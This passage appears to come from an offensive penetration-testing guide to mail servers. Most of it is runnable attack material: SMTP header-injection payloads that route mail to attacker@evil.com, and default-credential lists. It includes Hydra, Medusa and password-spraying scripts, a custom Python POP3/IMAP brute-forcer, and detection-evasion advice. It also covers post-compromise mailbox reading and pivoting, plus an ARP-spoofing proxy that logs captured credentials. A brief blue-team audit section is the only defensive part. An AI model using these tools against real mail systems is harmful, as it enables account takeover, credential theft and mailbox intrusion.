# Test each form
curl -X POST http://target.com/contact \
  -d "email=test%0ACc:attacker@evil.com@test.com" \
  -d "message=test"
```

2. **Automated testing script**:

```bash
#!/bin/bash
# smtp_injection_test.sh

URL=$1

payloads=(
  "%0ACc:attacker@evil.com"
  "%0ABcc:attacker@evil.com"
  "%0D%0ACc:attacker@evil.com"
  "\r\nCc:attacker@evil.com"
  "%0ASubject:Injected"
  "%0D%0A%0D%0AInjected body"
)

for payload in "${payloads[@]}"; do
  echo "[*] Testing payload: $payload"
  response=$(curl -s -X POST "$URL" \
    -d "email=test${payload}@test.com" \
    -d "subject=Test" \
    -d "message=Test")
  
  if echo "$response" | grep -qi "success\|thank\|sent"; then
    echo "[+] Potential injection: $payload"
  fi
done
```

**Parameter Pollution:**

```bash
# Multiple email parameters
curl -X POST http://target.com/contact \
  -d "email=legitimate@target.com" \
  -d "email=attacker@evil.com" \
  -d "subject=Test" \
  -d "message=Test"

# Array notation
curl -X POST http://target.com/contact \
  -d "email[]=legitimate@target.com" \
  -d "email[]=attacker@evil.com" \
  -d "subject=Test" \
  -d "message=Test"
```

### Default Credentials

**Common SMTP Default Credentials:**

```bash
# Common username/password combinations
admin:admin
admin:password
administrator:administrator
root:root
postmaster:postmaster
test:test
guest:guest
user:user
smtp:smtp
mail:mail
```

**Testing Default Credentials:**

1. **Manual testing with telnet**:

```bash
# Connect
telnet target.com 25

# Try AUTH LOGIN
EHLO test.com
AUTH LOGIN
# Server responds with: 334 VXNlcm5hbWU6 (Base64 for "Username:")

# Send base64 encoded username
echo -n "admin" | base64
# Paste result: YWRtaW4=

# Server responds with: 334 UGFzc3dvcmQ6 (Base64 for "Password:")

# Send base64 encoded password
echo -n "admin" | base64
# Paste result: YWRtaW4=

# Response:
# 235 = Authentication successful
# 535 = Authentication failed
```

2. **Using swaks**:

```bash
# Test authentication
swaks --to test@test.com --from test@test.com \
  --server target.com \
  --auth LOGIN \
  --auth-user admin \
  --auth-password admin

# Test multiple credentials
for user in admin root postmaster; do
  for pass in admin password root $user; do
    echo "[*] Testing $user:$pass"
    swaks --to test@test.com --from test@test.com \
      --server target.com \
      --auth LOGIN \
      --auth-user $user \
      --auth-password $pass 2>&1 | grep -i "authentication\|success"
  done
done
```

3. **Using Hydra**:

```bash
# Single target
hydra -l admin -p admin smtp://target.com

# Username and password lists
hydra -L users.txt -P passwords.txt smtp://target.com

# With specific port
hydra -L users.txt -P passwords.txt smtp://target.com:587

# SMTP with TLS
hydra -L users.txt -P passwords.txt smtps://target.com:465

# Limit parallel tasks
hydra -L users.txt -P passwords.txt smtp://target.com -t 4

# Verbose output
hydra -L users.txt -P passwords.txt smtp://target.com -V
```

4. **Using Metasploit**:

```bash
msfconsole
use auxiliary/scanner/smtp/smtp_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
set THREADS 5
run

# Test default credentials
set USERNAME admin
set PASSWORD admin
run
```

5. **Using nmap**:

```bash
# SMTP authentication brute force
nmap -p25,465,587 --script smtp-brute \
  --script-args userdb=users.txt,passdb=passwords.txt \
  target.com

# With default credentials
nmap -p25 --script smtp-brute target.com
```

**Vendor-Specific Default Credentials:**

```bash
# Exchange Server
cat > exchange_creds.txt <<EOF
administrator:password
admin:admin
postmaster:postmaster
EOF

# Postfix (usually no default credentials)
# Check for weak configurations

# SendMail
cat > sendmail_creds.txt <<EOF
root:root
mail:mail
daemon:daemon
EOF

# Mercury Mail
admin:admin
mercury:mercury

# hMailServer
admin:admin
administrator:administrator

# Zimbra
admin:admin
zimbra:zimbra
```

**Automated Credential Testing:**

```bash
#!/bin/bash
# smtp_default_creds.sh

TARGET=$1
PORT=${2:-25}

creds=(
  "admin:admin"
  "administrator:administrator"
  "root:root"
  "postmaster:postmaster"
  "test:test"
  "guest:guest"
  "user:user"
)

for cred in "${creds[@]}"; do
  user=$(echo $cred | cut -d':' -f1)
  pass=$(echo $cred | cut -d':' -f2)
  
  echo "[*] Testing $user:$pass"
  
  swaks --to test@test.com --from test@test.com \
    --server $TARGET:$PORT \
    --auth LOGIN \
    --auth-user $user \
    --auth-password $pass \
    --hide-all 2>&1 | grep -q "successfully" && \
    echo "[+] SUCCESS: $user:$pass" || \
    echo "[-] Failed: $user:$pass"
  
  sleep 1
done

# Usage: ./smtp_default_creds.sh target.com 25
```

**SMTP Authentication Methods:**

1. **AUTH PLAIN testing**:

```bash
# AUTH PLAIN format: base64(username\0username\0password)
# Generate credentials
echo -ne "admin\0admin\0admin" | base64
# Result: YWRtaW4AYWRtaW4AYWRtaW4=

# Test with telnet
telnet target.com 25
EHLO test.com
AUTH PLAIN YWRtaW4AYWRtaW4AYWRtaW4=

# Automated script
#!/bin/bash
generate_plain_auth() {
  local user=$1
  local pass=$2
  echo -ne "$user\0$user\0$pass" | base64
}

# Test credentials
for user in admin root postmaster; do
  for pass in admin password root; do
    auth_string=$(generate_plain_auth $user $pass)
    echo "[*] Testing $user:$pass"
    {
      echo "EHLO test.com"
      echo "AUTH PLAIN $auth_string"
      echo "QUIT"
    } | nc -w 3 target.com 25 | grep -i "235"
  done
done
```

2. **AUTH LOGIN testing** (covered above):

```bash
# Step-by-step base64 encoding
# Username
echo -n "admin" | base64
# Password
echo -n "password" | base64

# Interactive test
nc target.com 25
EHLO test.com
AUTH LOGIN
YWRtaW4=          # admin in base64
cGFzc3dvcmQ=      # password in base64
```

3. **AUTH CRAM-MD5 testing** [Inference - more complex, less common]:

```bash
# CRAM-MD5 requires challenge-response
# Typically tested with tools rather than manually

swaks --to test@test.com --from test@test.com \
  --server target.com \
  --auth CRAM-MD5 \
  --auth-user admin \
  --auth-password admin
```

**Testing Submission Ports:**

```bash
# Port 587 (Submission with STARTTLS)
swaks --to test@test.com --from test@test.com \
  --server target.com:587 \
  --tls \
  --auth LOGIN \
  --auth-user admin \
  --auth-password admin

# Port 465 (SMTPS - implicit TLS)
swaks --to test@test.com --from test@test.com \
  --server target.com:465 \
  --tls-on-connect \
  --auth LOGIN \
  --auth-user admin \
  --auth-password admin

# Port 25 with STARTTLS
swaks --to test@test.com --from test@test.com \
  --server target.com:25 \
  --tls \
  --auth LOGIN \
  --auth-user admin \
  --auth-password admin
```

**Web-Based Email Admin Interfaces:**

```bash
# Common paths
/webmail
/mail
/roundcube
/squirrelmail
/horde
/zimbra
/owa (Outlook Web Access)
/exchange

# Test default credentials on web interfaces
curl -X POST http://target.com/webmail/login \
  -d "username=admin&password=admin" \
  --cookie-jar cookies.txt

# Check for successful login
curl -b cookies.txt http://target.com/webmail/inbox | grep -i "inbox\|welcome"

# Automated web interface testing
for path in webmail mail roundcube squirrelmail; do
  echo "[*] Testing /$path"
  response=$(curl -s -X POST http://target.com/$path/login \
    -d "username=admin&password=admin" \
    -L -w "%{http_code}")
  if [ "$response" == "200" ]; then
    echo "[+] Potential access at /$path"
  fi
done
```

**SMTP Configuration Files:**

```bash
# Look for exposed configuration files with default credentials

# Common paths to test
/etc/postfix/main.cf
/etc/sendmail.cf
/etc/exim/exim.conf
/etc/mail/sendmail.cf
/usr/local/etc/postfix/main.cf

# Web-accessible paths
/.env
/config.php
/configuration.php
/settings.php
/mail_config.php
/smtp_config.ini

# Test with curl
curl http://target.com/.env
curl http://target.com/config/mail.php
curl http://target.com/includes/config.php

# Search for SMTP credentials in source code
curl -s http://target.com/js/mail.js | grep -i "smtp\|password\|username"
```

**Microsoft Exchange Default Credentials:**

```bash
# Common Exchange accounts
administrator:password
admin:password
exchange:exchange

# Test EWS (Exchange Web Services)
curl -u administrator:password https://target.com/ews/exchange.asmx

# Test OWA (Outlook Web Access)
curl -X POST https://target.com/owa/auth.owa \
  -d "destination=https://target.com/owa&username=administrator&password=password"

# Test ActiveSync
curl -u administrator:password \
  https://target.com/Microsoft-Server-ActiveSync \
  -H "MS-ASProtocolVersion: 14.0"

# Automated Exchange testing
#!/bin/bash
TARGET=$1
creds=(
  "administrator:password"
  "admin:admin"
  "administrator:Password123"
  "admin:Password123!"
)

for cred in "${creds[@]}"; do
  user=$(echo $cred | cut -d':' -f1)
  pass=$(echo $cred | cut -d':' -f2)
  
  echo "[*] Testing Exchange: $user:$pass"
  
  # Test EWS
  response=$(curl -s -k -u "$user:$pass" \
    "https://$TARGET/ews/exchange.asmx" \
    -w "%{http_code}" -o /dev/null)
  
  if [ "$response" == "200" ]; then
    echo "[+] SUCCESS on EWS: $user:$pass"
  fi
  
  # Test OWA
  response=$(curl -s -k -X POST "https://$TARGET/owa/auth.owa" \
    -d "destination=https://$TARGET/owa&username=$user&password=$pass" \
    -w "%{http_code}" -o /dev/null)
  
  if [ "$response" == "302" ]; then
    echo "[+] SUCCESS on OWA: $user:$pass"
  fi
done
```

**SMTP Server Fingerprinting:**

```bash
# Identify SMTP server type (helps target default credentials)
nmap -p25 --script banner target.com
nc target.com 25 | head -1

# Common banners:
# "220 server ESMTP Postfix" - Postfix
# "220 server Microsoft ESMTP MAIL Service" - Exchange
# "220 server ESMTP Sendmail" - Sendmail
# "220 server ESMTP Exim" - Exim
# "220-server ESMTP hMailServer" - hMailServer

# Detailed fingerprinting
nmap -p25,465,587 --script smtp-commands target.com
```

**Password Spraying for SMTP:**

```bash
# Create common password list
cat > smtp_passwords.txt <<EOF
password
password123
Password123
Password123!
Welcome1
Welcome123
Company123
Spring2024
Summer2024
Admin123
Admin@123
P@ssw0rd
P@ssword123
Passw0rd!
EOF

# Spray one password across all users (avoid lockout)
crackmapexec smtp target.com -u users.txt -p 'Password123' --delay 5

# Using custom script with delays
#!/bin/bash
TARGET=$1
PASSWORD=$2
DELAY=${3:-60}  # Default 60 seconds between attempts

while read user; do
  echo "[*] Testing $user with password: $PASSWORD"
  
  swaks --to test@test.com --from test@test.com \
    --server $TARGET \
    --auth LOGIN \
    --auth-user $user \
    --auth-password "$PASSWORD" \
    --hide-all 2>&1 | grep -q "successfully" && \
    echo "[+] SUCCESS: $user:$PASSWORD"
  
  echo "[*] Waiting $DELAY seconds..."
  sleep $DELAY
done < users.txt

# Usage: ./smtp_spray.sh target.com "Password123" 60
```

**SMTP Enumeration Combined with Default Credentials:**

```bash
#!/bin/bash
# Complete SMTP exploitation workflow

TARGET=$1
PORT=25

echo "[*] Phase 1: SMTP Enumeration"
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -t $TARGET -p $PORT | tee enum_results.txt

# Extract valid users
grep "exists" enum_results.txt | awk '{print $2}' > valid_users.txt

echo "[*] Phase 2: Default Credential Testing"
for user in $(cat valid_users.txt); do
  for pass in password Password123 $user; do
    echo "[*] Testing $user:$pass"
    
    swaks --to test@test.com --from test@test.com \
      --server $TARGET:$PORT \
      --auth LOGIN \
      --auth-user $user \
      --auth-password $pass \
      --hide-all 2>&1 | grep -q "successfully" && \
      echo "[+] VALID CREDENTIALS: $user:$pass" | tee -a valid_creds.txt
    
    sleep 2
  done
done

echo "[*] Phase 3: Testing Open Relay"
nmap -p$PORT --script smtp-open-relay $TARGET

echo "[*] Exploitation complete. Check valid_creds.txt for results."
```

**Testing Cloud Email Services:**

```bash
# Office 365 / Microsoft 365
curl -X POST https://login.microsoftonline.com/common/oauth2/token \
  -d "grant_type=password&resource=https://outlook.office365.com&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&username=user@domain.com&password=password"

# Google Workspace (Gmail)
# Typically requires OAuth, but can test with app passwords
curl --url 'smtps://smtp.gmail.com:465' \
  --mail-from 'user@domain.com' \
  --mail-rcpt 'test@test.com' \
  --user 'user@domain.com:app-password'

# AWS SES credentials testing
swaks --to test@test.com \
  --from user@domain.com \
  --server email-smtp.us-east-1.amazonaws.com:587 \
  --tls \
  --auth LOGIN \
  --auth-user SMTP_USERNAME \
  --auth-password SMTP_PASSWORD
```

**Post-Authentication Exploitation:**

```bash
# Once valid credentials are found:

# 1. Read emails via IMAP
openssl s_client -connect target.com:993 -quiet
a1 LOGIN admin password
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1:10 (BODY[])

# 2. Send emails as authenticated user
swaks --to victim@external.com \
  --from admin@target.com \
  --server target.com \
  --auth LOGIN \
  --auth-user admin \
  --auth-password password \
  --header "Subject: Internal Communication" \
  --body "Confidential message"

# 3. Access web interfaces
curl -u admin:password http://target.com/webmail/inbox

# 4. Pivot to other services
# Test same credentials on:
# - SSH
# - RDP
# - SMB
# - FTP
# - Web applications

crackmapexec smb target.com -u admin -p password
crackmapexec ssh target.com -u admin -p password
hydra -l admin -p password ftp://target.com
```

**Protecting Against Exploitation (Blue Team Awareness):**

```bash
# Check your own SMTP security:

# 1. Test for open relay
nmap -p25 --script smtp-open-relay localhost

# 2. Verify SPF/DKIM/DMARC
dig txt yourdomain.com | grep spf
dig txt _dmarc.yourdomain.com
dig txt default._domainkey.yourdomain.com

# 3. Check if VRFY/EXPN are disabled
echo "VRFY admin" | nc localhost 25
# Should return: 502 Command not implemented

# 4. Verify authentication is required
echo "MAIL FROM:<test@test.com>" | nc localhost 25
# Should require authentication for external recipients

# 5. Check for rate limiting
for i in {1..100}; do
  echo "VRFY user$i" | nc localhost 25
done
# Should implement rate limiting or blocking

# 6. Verify TLS is enforced
nmap -p25,587,465 --script ssl-enum-ciphers localhost

# 7. Check for default credentials
# Review /etc/postfix/sasl_passwd or equivalent
cat /etc/postfix/sasl_passwd
```

**SMTP Security Testing Checklist:**

```bash
#!/bin/bash
# smtp_security_audit.sh

TARGET=$1

echo "=== SMTP Security Audit for $TARGET ==="
echo ""

echo "[*] 1. Checking for open relay..."
nmap -p25 --script smtp-open-relay $TARGET | grep -A5 "open-relay"

echo "[*] 2. Testing VRFY/EXPN commands..."
echo "VRFY admin" | nc -w 3 $TARGET 25 | grep -v "502\|500"

echo "[*] 3. Checking authentication requirements..."
{
  echo "EHLO test.com"
  echo "MAIL FROM:<external@test.com>"
  echo "RCPT TO:<external@other.com>"
  echo "QUIT"
} | nc -w 5 $TARGET 25 | grep -i "authentication required\|relay denied"

echo "[*] 4. Testing for SPF record..."
dig txt $TARGET | grep "v=spf1"

echo "[*] 5. Testing for DMARC..."
dig txt _dmarc.$TARGET | grep "v=DMARC1"

echo "[*] 6. Checking TLS support..."
nmap -p25,587,465 --script ssl-enum-ciphers $TARGET | grep -A2 "TLS"

echo "[*] 7. Banner grabbing..."
nc -w 3 $TARGET 25 | head -1

echo ""
echo "=== Audit Complete ==="
```

---

**Important Related Topics:**

- Email header analysis and forensics
- DKIM signature forging
- SPF record bypass techniques
- Email bombing and DoS attacks
- IMAP/POP3 exploitation (complementary protocols)

---

## POP3/IMAP Exploitation

### Brute Force POP3/IMAP

POP3 and IMAP services accept credentials for email access. Brute force attacks target weak credentials to gain unauthorized mailbox access.

#### Service Identification and Enumeration

Locate and fingerprint POP3/IMAP services:

```bash
# Port scanning for POP3 (110) and IMAP (143)
nmap -p 110,143,993,995 target.com

# Service version detection
nmap -p 110,143 -sV target.com

# POP3 service fingerprinting
nmap -p 110 --script pop3-capabilities target.com
nmap -p 110 --script pop3-ntlm-info target.com

# IMAP service fingerprinting
nmap -p 143 --script imap-capabilities target.com
nmap -p 143 --script imap-ntlm-info target.com

# Banner grabbing
nc -v target.com 110
# Response: +OK mail.example.com HELLO

nc -v target.com 143
# Response: * OK IMAP4rev1 Service Ready

# OpenSSL connection for SSL/TLS versions
openssl s_client -connect target.com:995  # POP3S
openssl s_client -connect target.com:993  # IMAPS

# Active mail server detection via DNS
nslookup -type=MX example.com
dig MX example.com

# Identify mail server software version
timeout 5 telnet target.com 110 | grep -i "POP3\|Dovecot\|Cyrus\|Exchange"
timeout 5 telnet target.com 143 | grep -i "IMAP\|Dovecot\|Cyrus\|Exchange"
```

#### Hydra POP3 Brute Force

Use Hydra for systematic POP3 credential testing:

```bash
# Basic POP3 brute force
hydra -l user -p password pop3://target.com

# Multiple usernames and passwords
hydra -L users.txt -P passwords.txt pop3://target.com

# Common email usernames
echo -e "admin\npostmaster\ninfo\nsupport\ntest\nguest" > email_users.txt

# Weak password wordlist
hydra -L email_users.txt -P /usr/share/wordlists/rockyou.txt pop3://target.com

# Non-standard POP3 port
hydra -L users.txt -P passwords.txt pop3://target.com:1110

# SSL/TLS encrypted POP3 (port 995)
hydra -L users.txt -P passwords.txt pops://target.com

# Verbose output with attempt logging
hydra -L users.txt -P passwords.txt pop3://target.com -v

# Multiple threads for parallelization
hydra -L users.txt -P passwords.txt pop3://target.com -t 16

# Save results to file
hydra -L users.txt -P passwords.txt pop3://target.com -o /tmp/hydra_pop3.txt

# Exit on first success
hydra -L users.txt -P passwords.txt pop3://target.com -f
```

#### Hydra IMAP Brute Force

IMAP brute force using Hydra:

```bash
# Basic IMAP brute force
hydra -l user -p password imap://target.com

# Multiple users and passwords
hydra -L users.txt -P passwords.txt imap://target.com

# IMAP port variations
hydra -L users.txt -P passwords.txt imap://target.com:1143

# IMAPS (SSL/TLS on port 993)
hydra -L users.txt -P passwords.txt imaps://target.com

# Verbose IMAP brute force
hydra -L users.txt -P passwords.txt imap://target.com -v

# Threading for speed
hydra -L users.txt -P passwords.txt imap://target.com -t 16

# Save results
hydra -L users.txt -P passwords.txt imap://target.com -o /tmp/hydra_imap.txt

# IMAP with specific authentication method
# Note: Hydra autodetects, but you can test multiple methods
hydra -L users.txt -P passwords.txt imap://target.com -m PLAIN
hydra -L users.txt -P passwords.txt imap://target.com -m LOGIN
```

#### Medusa POP3/IMAP Brute Force

Alternative brute force approach using Medusa:

```bash
# Medusa POP3 attack
medusa -h target.com -u user -P passwords.txt -M pop3

# Multiple hosts
medusa -H hosts.txt -u user -P passwords.txt -M pop3

# Multiple users
medusa -h target.com -U users.txt -P passwords.txt -M pop3

# Verbose output
medusa -h target.com -u user -P passwords.txt -M pop3 -v 2

# Threading
medusa -h target.com -u user -P passwords.txt -M pop3 -t 16

# Output to file
medusa -h target.com -u user -P passwords.txt -M pop3 -O /tmp/medusa_pop3.txt

# Medusa IMAP attack
medusa -h target.com -u user -P passwords.txt -M imap

# Non-standard ports
medusa -h target.com:1110 -u user -P passwords.txt -M pop3
medusa -h target.com:1143 -u user -P passwords.txt -M imap
```

#### Custom POP3/IMAP Brute Force Script

Develop targeted brute force implementation:

```python
#!/usr/bin/env python3
import socket
import sys
import time
from threading import Thread, Lock
import base64

class POP3BruteForce:
    def __init__(self, target, port=110, threads=4):
        self.target = target
        self.port = port
        self.threads = threads
        self.lock = Lock()
        self.found = False
        self.successful_creds = []
    
    def pop3_connect(self, username, password):
        """Attempt POP3 authentication"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, self.port))
            
            # Receive banner
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            if not response.startswith('+OK'):
                sock.close()
                return False
            
            # Send USERNAME
            sock.send(f'USER {username}\r\n'.encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            if not response.startswith('+OK'):
                sock.close()
                return False
            
            # Send PASSWORD
            sock.send(f'PASS {password}\r\n'.encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            if response.startswith('+OK'):
                return True
        except Exception as e:
            pass
        return False
    
    def imap_connect(self, username, password):
        """Attempt IMAP authentication"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, self.port))
            
            # Receive greeting
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            if 'OK' not in response:
                sock.close()
                return False
            
            # IMAP LOGIN command
            cmd = f'A001 LOGIN "{username}" "{password}"\r\n'
            sock.send(cmd.encode())
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            if 'OK' in response and 'logged in' in response.lower():
                return True
        except Exception as e:
            pass
        return False
    
    def test_credentials(self, username, password, protocol='pop3'):
        """Test single credential pair"""
        if self.found and len(self.successful_creds) > 0:
            return False
        
        try:
            if protocol == 'pop3':
                success = self.pop3_connect(username, password)
            elif protocol == 'imap':
                success = self.imap_connect(username, password)
            else:
                return False
            
            if success:
                with self.lock:
                    print(f"\n[+] SUCCESS: {username}:{password} ({protocol})")
                    self.successful_creds.append((username, password, protocol))
                    self.found = True
                return True
        except Exception as e:
            pass
        return False
    
    def worker(self, credentials_queue, protocol):
        """Worker thread for credential testing"""
        while True:
            try:
                username, password = credentials_queue.get(timeout=1)
            except:
                break
            
            if not self.found:
                self.test_credentials(username, password, protocol)
    
    def brute_force(self, users, passwords, protocol='pop3'):
        """Execute brute force attack"""
        print(f"[*] Connecting to {self.target}:{self.port} ({protocol.upper()})")
        
        from queue import Queue
        q = Queue()
        
        # Populate queue
        for user in users:
            for passwd in passwords:
                q.put((user, passwd))
        
        print(f"[*] Starting {self.threads} threads for {len(users)*len(passwords)} attempts")
        
        # Create workers
        threads_list = []
        for _ in range(self.threads):
            t = Thread(target=self.worker, args=(q, protocol))
            t.start()
            threads_list.append(t)
        
        # Wait for completion
        for t in threads_list:
            t.join()
        
        if self.successful_creds:
            print(f"\n[+] Attack successful - {len(self.successful_creds)} credentials found")
            for creds in self.successful_creds:
                print(f"    {creds[0]}:{creds[1]} ({creds[2]})")
        else:
            print("[-] No valid credentials found")

class IMAPBruteForce(POP3BruteForce):
    """IMAP-specific brute force"""
    def __init__(self, target, port=143, threads=4):
        super().__init__(target, port, threads)

# Usage
if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "target.com"
    
    users = ["admin", "user", "test", "guest", "postmaster"]
    passwords = ["password", "123456", "admin", "letmein", "welcome"]
    
    # POP3 brute force
    pop3_brute = POP3BruteForce(target, port=110, threads=4)
    pop3_brute.brute_force(users, passwords, protocol='pop3')
    
    # IMAP brute force
    if not pop3_brute.found:
        imap_brute = IMAPBruteForce(target, port=143, threads=4)
        imap_brute.brute_force(users, passwords, protocol='imap')
```

#### Rate Limiting and Detection Evasion

Bypass brute force protections:

```bash
# Reduce thread count to avoid rate limiting
hydra -L users.txt -P passwords.txt pop3://target.com -t 1

# Add delays between attempts via wrapper script
#!/bin/bash
for user in $(cat users.txt); do
  for pass in $(cat passwords.txt); do
    timeout 5 nc -w2 target.com 110 << EOF
USER $user
PASS $pass
QUIT
EOF
    sleep 3  # Delay between attempts
  done
done

# Distribute attempts across multiple attempts per user
# Test 2-3 passwords per user, then rotate
for user in $(cat users.txt); do
  head -3 passwords.txt | while read pass; do
    hydra -l $user -p "$pass" pop3://target.com
  done
  sleep 10
done

# Use different connection sources (if multiple IPs available)
for ip in $(seq 1 10); do
  # From different source if possible via VPN/proxy
  hydra -L users.txt -P passwords.txt pop3://target.com
done

# Monitor for lockout indicators
# 421 error or connection reset may indicate rate limiting/lockout
# Adjust attack speed accordingly
```

### Cleartext Credential Capture

POP3 and IMAP protocols transmit credentials in cleartext without encryption, enabling passive credential capture through network interception.

#### Network Traffic Capture

Intercept POP3/IMAP authentication traffic:

```bash
# Capture traffic on specific ports
tcpdump -i any -w pop3_traffic.pcap 'tcp port 110'
tcpdump -i any -w imap_traffic.pcap 'tcp port 143'

# Capture with verbose ASCII output
tcpdump -i any -A 'tcp port 110 or tcp port 143'

# Filter for authentication commands
tcpdump -i any -A 'tcp port 110 or tcp port 143' | grep -E "USER|PASS|LOGIN|AUTHENTICATE"

# Save to file for later analysis
tcpdump -i any -A -w email_auth.pcap 'tcp port 110 or tcp port 143'

# Real-time credential extraction
tcpdump -i any -A 'tcp port 110 or tcp port 143' | \
  grep -oE 'USER .+|PASS .+|LOGIN ".+" ".+"' | \
  tee /tmp/captured_creds.txt
```

#### POP3 Cleartext Credential Analysis

Extract credentials from captured POP3 traffic:

```bash
# Parse captured POP3 traffic
strings pop3_traffic.pcap | grep -E "^USER|^PASS"

# More sophisticated extraction
python3 << 'EOF'
import re

def extract_pop3_credentials(pcap_file):
    """Extract POP3 credentials from pcap"""
    credentials = []
    
    try:
        with open(pcap_file, 'rb') as f:
            data = f.read()
            
        # Decode and search for POP3 commands
        text = data.decode('utf-8', errors='ignore')
        
        # Pattern: USER username followed by PASS password
        user_pattern = r'USER\s+(\S+)'
        pass_pattern = r'PASS\s+(\S+)'
        
        users = re.findall(user_pattern, text)
        passwords = re.findall(pass_pattern, text)
        
        # Pair credentials
        for user, password in zip(users, passwords):
            credentials.append((user, password))
            print(f"[+] Found: {user}:{password}")
        
        return credentials
    except Exception as e:
        print(f"[-] Error: {e}")
        return []

extract_pop3_credentials('/path/to/pop3_traffic.pcap')
EOF

# Using Wireshark for analysis
wireshark pop3_traffic.pcap
# Filter: tcp.port == 110
# Follow TCP stream to see credentials
```

#### IMAP Cleartext Credential Analysis

Extract credentials from captured IMAP traffic:

```bash
# Parse IMAP authentication
strings imap_traffic.pcap | grep -i "LOGIN\|AUTHENTICATE"

# Extract LOGIN credentials
python3 << 'EOF'
import re

def extract_imap_credentials(pcap_file):
    """Extract IMAP credentials from pcap"""
    credentials = []
    
    try:
        with open(pcap_file, 'rb') as f:
            data = f.read()
        
        text = data.decode('utf-8', errors='ignore')
        
        # IMAP LOGIN command pattern
        # Format: A001 LOGIN "username" "password"
        login_pattern = r'LOGIN\s+"([^"]+)"\s+"([^"]+)"'
        matches = re.findall(login_pattern, text, re.IGNORECASE)
        
        for username, password in matches:
            credentials.append((username, password))
            print(f"[+] Found: {username}:{password}")
        
        return credentials
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return []

extract_imap_credentials('/path/to/imap_traffic.pcap')
EOF

# Wireshark IMAP analysis
wireshark imap_traffic.pcap
# Filter: tcp.port == 143
# Follow TCP stream to identify LOGIN commands
```

#### Man-in-the-Middle Credential Capture

Position to intercept POP3/IMAP traffic:

```bash
# ARP spoofing to enable MITM
arpspoof -i eth0 -t victim.com gateway.com

# Route traffic through attacker machine
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -p tcp --dport 110 -j REDIRECT --to-port 1110
iptables -t nat -A PREROUTING -p tcp --dport 143 -j REDIRECT --to-port 1143

# Listen on intercepted ports
nc -l -p 1110 -q 1 | tee /tmp/pop3_capture.txt | nc target-mail-server.com 110

# More sophisticated proxy that logs credentials
python3 << 'EOF'
import socket
import sys
import threading
import re

class MailProxy:
    def __init__(self, listen_port, target_host, target_port, protocol='pop3'):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.protocol = protocol
        self.credentials = []
    
    def handle_client(self, client_socket, addr):
        """Handle client connection and log credentials"""
        try:
            # Connect to real server
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((self.target_host, self.target_port))
            
            # Forward traffic and capture credentials
            def forward(src, dst, credentials_list):
                while True:
                    data = src.recv(1024)
                    if not data:
                        break
                    
                    # Log POP3/IMAP commands
                    text = data.decode('utf-8', errors='ignore')
                    if 'USER' in text or 'PASS' in text or 'LOGIN' in text:
                        print(f"[*] {self.protocol.upper()}: {text.strip()}")
                        credentials_list.append(text)
                    
                    dst.send(data)
            
            # Bidirectional forwarding
            t1 = threading.Thread(
                target=forward,
                args=(client_socket, server_socket, self.credentials)
            )
            t2 = threading.Thread(
                target=forward,
                args=(server_socket, client_socket, self.credentials)
            )
            t1.daemon = True
            t2.daemon = True
            t1.start()
            t2.start()
            
            t1.join()
            t2.join()
        except Exception as e:
            print(f"Error: {e}")
        finally:
            client_socket.close()
            server_socket.close()
    
    def start(self):
        """Start proxy server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.listen_port))
        server.listen(5)
        
        print(f"[*] {self.protocol.upper()} proxy listening on port {self.listen_port}")
        
        try:
            while True:
                client, addr = server.accept()
                t = threading.Thread(target=self.handle_client, args=(client, addr))
                t.daemon = True
                t.start()
        except KeyboardInterrupt:
            print("\n[*] Proxy stopped")
            server.close()

# Usage
pop3_proxy = MailProxy(1110, 'mail.target.com', 110, 'pop3')
pop3_proxy.start()
EOF
```

### CRAM-MD5 Weaknesses

CRAM-MD5 authentication mechanism has known weaknesses enabling credential compromise.

#### CRAM-MD5 Overview

[Inference] CRAM-MD5 uses a challenge-response mechanism with MD5 hashing. Weaknesses include weak challenge generation, MD5 vulnerability, and potential replay attacks.

```bash
# Detect CRAM-MD5 support
telnet target.com 110
# Server may advertise AUTH CRAM-MD5 in capabilities

# IMAP CRAM-MD5 detection
telnet target.com 143
# CAPABILITY response may include AUTH=CRAM-MD5
```

#### CRAM-MD5 Authentication Flow

Understanding the authentication process:

```
Client connects to server
Server sends challenge (typically timestamp + hostname)
Client computes: MD5(challenge + password)
Client sends: username space hex(MD5(...))
Server verifies response
```

#### CRAM-MD5 Credential Extraction

Exploit CRAM-MD5 weaknesses:

```python
#!/usr/bin/env python3
import socket
import hashlib
import hmac
import base64
import sys

class CRAMMD5Exploit:
    def __init__(self, target, port=110):
        self.target = target
        self.port = port
    
    def connect_and_get_challenge(self):
        """Connect and retrieve CRAM-MD5 challenge"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target, self.port))
            
            # Receive banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            print(f"[*] Banner: {banner.strip()}")
            
            # Request CRAM-MD5
            sock.send(b'AUTH CRAM-MD5\r\n')
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            print(f"[*] Server response: {response.strip()}")
            
            # Extract challenge (base64 encoded)
            if response.startswith('+'):
                challenge_b64 = response[2:].strip()
                challenge = base64.b64decode(challenge_b64).decode('utf-8', errors='ignore')
                print(f"[+] Challenge: {challenge}")
                return sock, challenge
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return None, None
    
    def compute_cram_response(self, username, password, challenge):
        """Compute CRAM-MD5 response"""
